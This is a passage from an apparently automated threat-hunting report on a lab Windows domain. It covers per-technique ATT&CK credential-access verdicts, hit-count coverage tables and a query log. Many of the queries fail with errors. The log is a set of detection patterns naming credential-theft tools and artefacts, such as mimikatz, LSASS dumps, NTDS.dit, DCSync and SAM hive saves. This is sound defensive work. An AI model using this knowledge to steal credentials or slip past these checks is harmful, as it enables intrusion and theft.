| T1556.007 Hybrid Identity | not_observed | 7045 installs are PSEXESVC (attacker PsExec) and javamtsup.exe; no hybrid identity/ADFS/connector modification and no 5136 directory changes. |
| T1556.008 Network Provider DLL | not_observed | No NetworkProvider registry writes or 4657 events; no DLL dropped into a NetworkProvider path. |
| T1557 Adversary-in-the-Middle | not_observed | No interposition on network traffic: DNS queries, connection destinations and object-access events all reflect normal AD/Microsoft traffic; the credential theft in this window was performed directly on hosts (registry-st… |
| T1557.001 Name Resolution Poisoning and SMB Relay | not_observed | SMB sessions are Kerberos/gssapi domain authentication to 10.0.0.4; SMB attempts to 192.168.0.4 were rejected; no LLMNR/NBT-NS poisoning or relayed NTLM logons observed. |
| T1557.002 ARP Cache Poisoning | not_observable | No ARP telemetry in the available datasets; indirect indicators (stable destinations, correct internal DNS answers, Kerberos-only network logons) show no poisoning, but ARP itself cannot be inspected. |
| T1557.003 DHCP Spoofing | not_observed | No DHCP traffic on UDP 67/68 in zeek and no DHCP server events; the only ipconfig/netsh activity is the Azure Network Watcher agent's trace capture on scranton. |
| T1558 Steal or Forge Kerberos Tickets | not_observed | No Kerberos ticket theft or forgery. Zeek Kerberos (2020-04-30 window) shows only normal AES256 AS/TGS for pbeesly/DMEVALS.LOCAL against KDC 10.0.0.4; no RC4, no ticket anomalies. Rare LSASS handle masks come from SYSTEM… |
| T1558.001 Golden Ticket | not_observed | No golden-ticket indicators: no krbtgt hash extraction, no forged-TGT privilege anomalies. 4672 events are all NEWYORK$ machine-account logons with the standard machine privilege list; the only krbtgt TGS is a normal ren… |
| T1558.002 Silver Ticket | not_observed | No silver-ticket indicators: all TGS requests are AES256 for cifs/NEWYORK, cifs/NASHUA, host/nashua.dmevals.local, ldap/NEWYORK.dmevals.local and HTTP/NASHUA by pbeesly, each preceded by a successful AS exchange; no silv… |
| T1558.003 Kerberoasting | not_observed | No Kerberoasting: only 11 TGS requests in the zeek window, all AES256 for a single principal, no RC4 etype-23 requests, no service-account TGS burst, and no kerberoast/Invoke-Kerberoast/GetUserSPNs/SPN strings in PowerSh… |
| T1558.004 AS-REP Roasting | not_observed | No AS-REP Roasting: every AS request returned KDC_ERR_PREAUTH_REQUIRED before succeeding with AES256, so pre-authentication was enforced; no asreproast/GetNPUsers/Rubeus command lines or script blocks. |
| T1606 Forge Web Credentials | not_observed | No forged web credentials. 4648 hits are PsExec (PSEXESVC.exe) and DWM/UMFD/machine-account logons; rare Sysmon 10 masks are svchost->wmiprvse, services/csrss->sppsvc, svchost->svchost with WMI/RPC call traces. |
| T1606.001 Web Cookies | not_observed | No cookie files written or forged (only a benign LocalService INetCookies path). The session does contain malicious activity (cod.3aka3.scr, PsExec with cleartext password, python.exe beaconing to 192.168.0.4:8443) but i… |
| T1606.002 SAML Tokens | not_observed | All 4624 logons use standard Kerberos/Negotiate/NTLM packages and standard logon processes; no SAML/ADFS token artifacts or unusual authentication packages in the retrieved events. |
| T1621 Multi-Factor Authentication Request Generatio… | not_observed | 2 planned checks, all with zero hits |
| T1649 Steal or Forge Authentication Certificates | malicious | On scranton.dmevals.local, PowerShell (PID 3876, user pbeesly) read a persisted machine key and exported it (Security 5058 'Read persisted key from file' + 5059 'Export of persistent cryptographic key', RSA, key {ADA1F32… |

## Coverage

Cells: number of hits of the planned checks, `n/a` (reason in report.json), or GAP.

| Technique | windows.other | windows.powershell | windows.security | windows.sysmon | zeek |
|---|---|---|---|---|---|
| T1003 OS Credential Dumping | 0 hits | 0 hits | 5797 hits | 39730 hits | n/a |
| T1003.001 LSASS Memory | 0 hits | 0 hits | 1394 hits | 328 hits | n/a |
| T1003.002 Security Account Manager | 0 hits | 0 hits | 6 hits | 209 hits | n/a |
| T1003.003 NTDS | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1003.004 LSA Secrets | 0 hits | 0 hits | 13 hits | 55 hits | n/a |
| T1003.005 Cached Domain Credentials | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1003.006 DCSync | 0 hits | 0 hits | 14 hits | 0 hits | n/a |
| T1040 Network Sniffing | 5 hits | 0 hits | 25 hits | 0 hits | 613 hits |
| T1056 Input Capture | 0 hits | 0 hits | 10977 hits | 39609 hits | 613 hits |
| T1056.001 Keylogging | 5 hits | 0 hits | 10977 hits | 17867 hits | 613 hits |
| T1056.002 GUI Input Capture | 2 hits | 5496 hits | 3 hits | 3 hits | 613 hits |
| T1056.003 Web Portal Capture | 0 hits | 0 hits | 0 hits | 0 hits | 62 hits |
| T1056.004 Credential API Hooking | n/a | n/a | 13 hits | 59963 hits | n/a |
| T1110 Brute Force | n/a | n/a | 0 hits | 32 hits | n/a |
| T1110.001 Password Guessing | n/a | n/a | 0 hits | n/a | n/a |
| T1110.002 Password Cracking | n/a | n/a | 11437 hits | 2422 hits | n/a |
| T1110.003 Password Spraying | n/a | n/a | 15 hits | n/a | n/a |
| T1110.004 Credential Stuffing | n/a | n/a | 0 hits | n/a | n/a |
| T1111 Multi-Factor Authentication Interception | 2 hits | 2 hits | 594 hits | 652 hits | n/a |
| T1187 Forced Authentication | 1 hits | 0 hits | 11140 hits | 69 hits | n/a |
| T1212 Exploitation for Credential Access | 0 hits | 0 hits | 70 hits | 652 hits | n/a |
| T1539 Steal Web Session Cookie | 3 hits | 13 hits | 4 hits | 162 hits | n/a |
| T1552 Unsecured Credentials | 3 hits | 3 hits | 6 hits | 28 hits | n/a |
| T1552.001 Credentials In Files | 0 hits | 3 hits | 312 hits | 519 hits | n/a |
| T1552.002 Credentials in Registry | 10 hits | 5 hits | 0 hits | 20 hits | n/a |
| T1552.003 Shell History | 7 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1552.004 Private Keys | 7 hits | 1 hits | 0 hits | 1 hits | n/a |
| T1552.006 Group Policy Preferences | 7 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1555 Credentials from Password Stores | 6 hits | 3 hits | 6 hits | 653 hits | n/a |
| T1555.003 Credentials from Web Browsers | 7 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1555.004 Windows Credential Manager | 2 hits | 0 hits | 0 hits | 326 hits | n/a |
| T1555.005 Password Managers | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1556 Modify Authentication Process | 4 hits | 0 hits | 0 hits | 673 hits | n/a |
| T1556.001 Domain Controller Authentication | 0 hits | 0 hits | 312 hits | 359 hits | n/a |
| T1556.002 Password Filter DLL | 5 hits | 0 hits | 0 hits | 36 hits | n/a |
| T1556.005 Reversible Encryption | 0 hits | 1 hits | 0 hits | 0 hits | n/a |
| T1556.006 Multi-Factor Authentication | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1556.007 Hybrid Identity | 5 hits | 0 hits | 218 hits | 20259 hits | n/a |
| T1556.008 Network Provider DLL | 5 hits | 0 hits | 0 hits | 39708 hits | n/a |
| T1557 Adversary-in-the-Middle | 0 hits | 0 hits | 10977 hits | 1310 hits | 613 hits |
| T1557.001 Name Resolution Poisoning and SMB Relay | 5 hits | 0 hits | 241 hits | 147 hits | 613 hits |
| T1557.002 ARP Cache Poisoning | 0 hits | 0 hits | 218 hits | 1310 hits | 613 hits |
| T1557.003 DHCP Spoofing | 0 hits | 0 hits | 297 hits | 5 hits | 0 hits |
| T1558 Steal or Forge Kerberos Tickets | 88 hits | 0 hits | 448 hits | 326 hits | 35 hits |
| T1558.001 Golden Ticket | 88 hits | 0 hits | 448 hits | 326 hits | 35 hits |
| T1558.002 Silver Ticket | 88 hits | 0 hits | 448 hits | 326 hits | 35 hits |
| T1558.003 Kerberoasting | 88 hits | 0 hits | 509 hits | 326 hits | 35 hits |
| T1558.004 AS-REP Roasting | 88 hits | 0 hits | 297 hits | 0 hits | 35 hits |
| T1606 Forge Web Credentials | n/a | n/a | 312 hits | 39283 hits | n/a |
| T1606.001 Web Cookies | n/a | n/a | 297 hits | 1649 hits | n/a |
| T1606.002 SAML Tokens | n/a | n/a | 312 hits | n/a | n/a |
| T1621 Multi-Factor Authentication Request Generatio… | n/a | n/a | 0 hits | n/a | n/a |
| T1649 Steal or Forge Authentication Certificates | n/a | n/a | 50 hits | 1649 hits | n/a |

Cells: 265, gaps: 0.

## Queries

Every MCP tool call of this run (1262), in order (source: mcp_audit.jsonl written by the MCP server).

| Query | Phase | Tool | Arguments | Hits / rows | Cited by |
|---|---|---|---|---|---|
| q-c999d0ad46 | scope | list_data_sources | {} | None |  |
| q-970a55c4b7 | scope | get_registry | {} | None |  |
| q-2be8a390e6 | scope | get_fields | {"dataset": "windows.other", "prefix": ""} | None |  |
| q-96ea4696cb | scope | get_fields | {"dataset": "windows.powershell", "prefix": ""} | None |  |
| q-a17fcd5fb5 | scope | get_fields | {"dataset": "windows.security", "prefix": ""} | None |  |
| q-1e419c4e45 | scope | get_fields | {"dataset": "windows.sysmon", "prefix": ""} | None |  |
| q-92c14b63b5 | scope | get_fields | {"dataset": "zeek", "prefix": ""} | None |  |
| q-bcf2caa6d4 | check C001 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 447 |  |
| q-e36aceb410 | check C002 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 39283 |  |
| q-db8fb55d0e | check C003 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 5337 |  |
| q-2ff32631af | check C004 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 460 |  |
| q-1c067d6594 | check C005 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*mimikatz*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*sekurlsa*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*i… | ERROR |  |
| q-242559afca | check C005 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*mimikatz*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*sekurlsa*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*i… | ERROR |  |
| q-673602b608 | check C006 | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*lsass*\" OR TO_LOWER(message) LIKE \"*mimikatz*\" OR TO_LOWER(message) LIKE \"*procdump*\" OR TO_LOWER(message) LIKE \"*ntds*\" \| KEEP @timestamp, host.name, event.code, mes… | ERROR |  |
| q-ce4bf12e61 | check C006 (repaired) | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*lsass*\" OR TO_LOWER(message) LIKE \"*mimikatz*\" OR TO_LOWER(message) LIKE \"*procdump*\" OR TO_LOWER(message) LIKE \"*ntds*\" \| KEEP @timestamp, host.name, event.code, mes… | ERROR |  |
| q-ab1aed9f5f | check C007 | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 10 AND TO_LOWER(win.TargetImage) LIKE \"*lsass.exe\" \| KEEP @timestamp, host.name, process.executable, win.TargetImage, win.GrantedAccess, _id, _index"} | ERROR |  |
| q-5e33acf39a | check C007 (repaired) | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 10 AND TO_LOWER(win.TargetImage) LIKE \"*lsass.exe\" \| KEEP @timestamp, host.name, process.executable, win.TargetImage, win.GrantedAccess, _id, _index"} | ERROR |  |
| q-c8decab265 | check C008 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 326 |  |
| q-cc1bf8bb5a | check C009 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11 AND (win.TargetFilename:*lsass* OR win.TargetFilename:*.dmp)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 2 |  |
| q-c391d8c8d6 | check C010 | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 13 AND TO_LOWER(registry.path) LIKE \"*lsa*\" \| KEEP @timestamp, host.name, registry.path, registry.data.strings, _id, _index"} | ERROR |  |
| q-791fe9e23b | check C010 (repaired) | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 13 AND TO_LOWER(registry.path) LIKE \"*lsa*\" \| KEEP @timestamp, host.name, registry.path, registry.data.strings, _id, _index"} | ERROR |  |
| q-d472419ec9 | check C011 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4673", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 934 |  |
| q-206247e1e2 | check C012 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 460 |  |
| q-c419acbb18 | check C013 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*comsvcs*\" \| KEEP @timestamp, host.name, win.ScriptBl… | ERROR |  |
| q-f0a3a0f90b | check C013 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*comsvcs*\" \| KEEP @timestamp, host.name, win.ScriptBl… | ERROR |  |
| q-e02316779c | check C014 | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*lsass*\" \| KEEP @timestamp, host.name, event.code, message, _id, _index"} | ERROR |  |
| q-1c2c255beb | check C014 (repaired) | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*lsass*\" \| KEEP @timestamp, host.name, event.code, message, _id, _index"} | ERROR |  |
| q-60ae3d9bbf | check C015 | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 11 AND (TO_LOWER(win.TargetFilename) LIKE \"*\\\\config\\\\sam*\" OR TO_LOWER(win.TargetFilename) LIKE \"*\\\\config\\\\system*\" OR TO_LOWER(win.TargetFilename) LIKE \"*\\\\config\\\\s… | ERROR |  |
| q-050145adf0 | check C015 (repaired) | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 11 AND (TO_LOWER(win.TargetFilename) LIKE \"*config\\\\\\\\sam*\" OR TO_LOWER(win.TargetFilename) LIKE \"*config\\\\\\\\system*\" OR TO_LOWER(win.TargetFilename) LIKE \"*config\\\\\\\\s… | ERROR |  |
| q-70622e4528 | check C016 | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 13 AND (TO_LOWER(registry.path) LIKE \"*\\\\sam\\\\sam*\" OR TO_LOWER(registry.path) LIKE \"*\\\\security\\\\policy\\\\secrets*\") \| KEEP @timestamp, host.name, registry.path, registry… | ERROR |  |
| q-36e617ad2d | check C016 (repaired) | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 13 AND (TO_LOWER(registry.path) LIKE \"*\\\\\\\\sam\\\\\\\\sam*\" OR TO_LOWER(registry.path) LIKE \"*\\\\\\\\security\\\\\\\\policy\\\\\\\\secrets*\") \| KEEP @timestamp, host.name, reg… | ERROR |  |
| q-23b02e81e4 | check C017 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:2", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 209 |  |
| q-d4b659760e | check C018 | aggregate | {"dataset": "windows.security", "field": "process.command_line", "query": "event.code:4688 AND (process.command_line:*reg* OR process.command_line:*save* OR process.command_line:*sam*)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 6 |  |
| q-21372dbb5f | check C019 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*SAM* OR win.ObjectName:*SECURITY*)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-76f2174e65 | check C020 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*reg save*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*\\\\sam*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*hklm\\\\sam*\" \| KEEP @timestamp, host.name, win.Sc… | ERROR |  |
| q-4b256ad136 | check C020 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*reg save*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*sam*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*hklm*sam*\" \| KEEP @timestamp, host.name, win.ScriptBlo… | ERROR |  |
| q-17f48863da | check C021 | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*\\\\sam*\" OR TO_LOWER(message) LIKE \"*reg save*\" \| KEEP @timestamp, host.name, event.code, message, _id, _index"} | ERROR |  |
| q-d599bfcfc0 | check C021 (repaired) | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*\\\\\\\\sam*\" OR TO_LOWER(message) LIKE \"*reg save*\" \| KEEP @timestamp, host.name, event.code, message, _id, _index"} | ERROR |  |
| q-5cd71ebf0a | check C022 | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 11 AND TO_LOWER(win.TargetFilename) LIKE \"*ntds.dit*\" \| KEEP @timestamp, host.name, win.TargetFilename, process.executable, _id, _index"} | ERROR |  |
| q-67be1a9bc1 | check C022 (repaired) | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 11 AND TO_LOWER(win.TargetFilename) LIKE \"*ntds.dit*\" \| KEEP @timestamp, host.name, win.TargetFilename, process.executable, _id, _index"} | ERROR |  |
| q-12c0782a41 | check C023 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:2 AND win.TargetFilename:*ntds*", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-9dd8c50851 | check C024 | aggregate | {"dataset": "windows.security", "field": "process.command_line", "query": "event.code:4688 AND (process.command_line:*ntds* OR process.command_line:*vssadmin* OR process.command_line:*ntdsutil*)", "time_from": null, "time_to": null, "size": 100, "sub_field": n… | 0 |  |
| q-ebca50bf5f | check C025 | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*ntds*\" OR TO_LOWER(message) LIKE \"*shadow copy*\" OR TO_LOWER(message) LIKE \"*vssadmin*\" \| KEEP @timestamp, host.name, event.code, message, _id, _index"} | ERROR |  |
| q-ceebc06a9f | check C025 (repaired) | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*ntds*\" OR TO_LOWER(message) LIKE \"*shadow copy*\" OR TO_LOWER(message) LIKE \"*vssadmin*\" \| KEEP @timestamp, host.name, event.code, message, _id, _index"} | ERROR |  |
| q-d16e615863 | check C026 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*ntds*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*vssadmin*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*ntdsutil*\" \| KEEP @timestamp, host.name, win.ScriptBl… | ERROR |  |
| q-c0436c87df | check C026 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*ntds*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*vssadmin*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*ntdsutil*\" \| KEEP @timestamp, host.name, win.ScriptBl… | ERROR |  |
| q-96d3c80094 | check C027 | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 10 AND TO_LOWER(win.TargetImage) LIKE \"*lsass.exe\" \| KEEP @timestamp, host.name, process.executable, win.TargetImage, win.GrantedAccess, _id, _index"} | ERROR |  |
| q-f56d722a1d | check C027 (repaired) | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 10 AND TO_LOWER(win.TargetImage) LIKE \"*lsass.exe\" \| KEEP @timestamp, host.name, process.executable, win.TargetImage, win.GrantedAccess, _id, _index"} | ERROR |  |
| q-1a58e02957 | check C028 | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 13 AND TO_LOWER(registry.path) LIKE \"*\\\\security\\\\policy\\\\secrets*\" \| KEEP @timestamp, host.name, registry.path, registry.data.strings, _id, _index"} | ERROR |  |
| q-2084ebe5f4 | check C028 (repaired) | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 13 AND TO_LOWER(registry.path) LIKE \"*security\\\\policy\\\\secrets*\" \| KEEP @timestamp, host.name, registry.path, registry.data.strings, _id, _index"} | ERROR |  |
| q-e65f20b0f3 | check C029 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7 AND (win.ImageLoaded:*samlib* OR win.ImageLoaded:*vault* OR win.ImageLoaded:*cryptdll*)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 55 |  |
| q-34f4704c61 | check C030 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*SECURITY* OR win.ObjectName:*Policy*Secrets*)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-feb688b9a4 | check C031 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4656 AND (win.ObjectName:*SECURITY* OR win.ObjectName:*lsass*)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 13 |  |
| q-ee660c4f3a | check C032 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*policy\\\\secrets*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*lsa*secret*\" \| KEEP @timestamp, host.name, win.ScriptBlockText, _id, _index"} | ERROR |  |
| q-f86acd65e8 | check C032 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*policy*secrets*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*lsa*secret*\" \| KEEP @timestamp, host.name, win.ScriptBlockText, _id, _index"} | ERROR |  |
| q-f42807fd2c | check C033 | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*policy\\\\secrets*\" OR TO_LOWER(message) LIKE \"*lsa*\" \| KEEP @timestamp, host.name, event.code, message, _id, _index"} | ERROR |  |
| q-032be5f02f | check C033 (repaired) | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*policy\\\\\\\\secrets*\" OR TO_LOWER(message) LIKE \"*lsa*\" \| KEEP @timestamp, host.name, event.code, message, _id, _index"} | ERROR |  |
| q-fd2c19260c | check C034 | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 10 AND TO_LOWER(win.TargetImage) LIKE \"*lsass.exe\" \| KEEP @timestamp, host.name, process.executable, win.TargetImage, win.GrantedAccess, _id, _index"} | ERROR |  |
| q-9db0c04c81 | check C034 (repaired) | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 10 AND TO_LOWER(win.TargetImage) LIKE \"*lsass.exe\" \| KEEP @timestamp, host.name, process.executable, win.TargetImage, win.GrantedAccess, _id, _index"} | ERROR |  |
| q-f7f98b15af | check C035 | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 13 AND (TO_LOWER(registry.path) LIKE \"*\\\\cache*\" OR TO_LOWER(registry.path) LIKE \"*cachedlogons*\" OR TO_LOWER(registry.path) LIKE \"*nl$*\") \| KEEP @timestamp, host.name, registr… | ERROR |  |
| q-be188c4e89 | check C035 (repaired) | esql | {"query": "FROM windows.sysmon METADATA _id, _index \| WHERE event.code == 13 AND (TO_LOWER(registry.path) LIKE \"*cache*\" OR TO_LOWER(registry.path) LIKE \"*cachedlogons*\" OR TO_LOWER(registry.path) LIKE \"*nl$*\") \| KEEP @timestamp, host.name, registry.pa… | ERROR |  |
| q-85df12e055 | check C036 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*Cache* OR win.ObjectName:*NL$*)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-799e2eafae | check C037 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4656 AND (win.ObjectName:*Cache* OR win.ObjectName:*NL$*)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-579b39dc0b | check C038 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*cachedlogonscount*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*nl$*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*cache*\" \| KEEP @timestamp, host.name, win.Scr… | ERROR |  |
| q-664e197028 | check C038 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*cachedlogonscount*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*nl$*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*cache*\" \| KEEP @timestamp, host.name, win.Scr… | ERROR |  |
| q-4a668e0022 | check C039 | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*cachedlogonscount*\" OR TO_LOWER(message) LIKE \"*nl$*\" \| KEEP @timestamp, host.name, event.code, message, _id, _index"} | ERROR |  |
| q-7a45e5d79a | check C039 (repaired) | esql | {"query": "FROM windows.other METADATA _id, _index \| WHERE TO_LOWER(message) LIKE \"*cachedlogonscount*\" OR TO_LOWER(message) LIKE \"*nl$*\" \| KEEP @timestamp, host.name, event.code, message, _id, _index"} | ERROR |  |
| q-9977b169a3 | check C040 | count | {"dataset": "windows.security", "query": "event.code:4662", "time_from": null, "time_to": null} | 7 |  |
| q-f206abb30d | check C041 | aggregate | {"dataset": "windows.security", "field": "win.Properties", "query": "event.code:4662", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 7 |  |
| q-61c88fc664 | check C042 | count | {"dataset": "windows.security", "query": "event.code:4929", "time_from": null, "time_to": null} | 0 |  |
| q-cd93242951 | check C043 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*drsuapi* OR process.command_line:*lsadump* OR process.command_line:*dcsync*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-a3a18d4cc0 | check C044 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*DCSync* OR win.ScriptBlockText:*lsadump* OR win.ScriptBlockText:*drsuapi* OR win.ScriptBlockText:*Invoke-Mimikatz*)", "time_from": null, "time_to": null, "fields": ["@timesta… | 0 |  |
| q-dc2e7a5bc0 | check C045 | search | {"dataset": "windows.other", "query": "message:*drsuapi* OR message:*DCSync* OR message:*lsadump*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pr… | 0 |  |
| q-b88efbabe9 | check C046 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688 AND (process.command_line:*pktmon* OR process.command_line:*netsh* OR process.command_line:*windump* OR process.command_line:*tcpdump* OR process.command_line:*rawcap* OR … | 2 |  |
| q-e5533bdba4 | check C047 | aggregate | {"dataset": "windows.security", "field": "win.ServiceName", "query": "event.code:4697 OR event.code:7045", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 23 |  |
| q-e8b0a0302e | check C048 | aggregate | {"dataset": "windows.other", "field": "win.ServiceName", "query": "event.code:7045", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 5 |  |
| q-2b45a32a15 | check C049 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7 AND (win.ImageLoaded:*pcap* OR win.ImageLoaded:*npcap* OR win.ImageLoaded:*wpcap*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-fe8937a196 | check C050 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*pktmon* OR win.ScriptBlockText:*netsh* OR win.ScriptBlockText:*capture*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.d… | 0 |  |
| q-6a90e9b9c5 | check C051 | aggregate | {"dataset": "zeek", "field": "zeek.service", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 613 |  |
| q-a568281113 | check C052 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-74352c8ae0 | check C053 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
